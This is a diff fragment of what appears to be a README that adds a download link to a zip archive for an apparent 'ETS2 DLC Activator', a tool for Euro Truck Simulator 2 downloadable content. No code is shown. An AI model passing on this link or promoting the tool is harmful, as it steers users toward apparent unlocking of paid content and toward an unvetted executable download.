@@ -14,7 +14,7 @@
 
 ### - 🔗 ***Get Latest Release:***
 
-- [💾 v1.6.3 Release]() = `*Tool files & folder*`
+- [💾 v1.6.3 Release](https://github.com/ETS-2-DLC-Activator/.github/releases/download/1.6.3/ETS2-DLC-manager.zip) = `*Tool files & folder*`
 
 ---
 
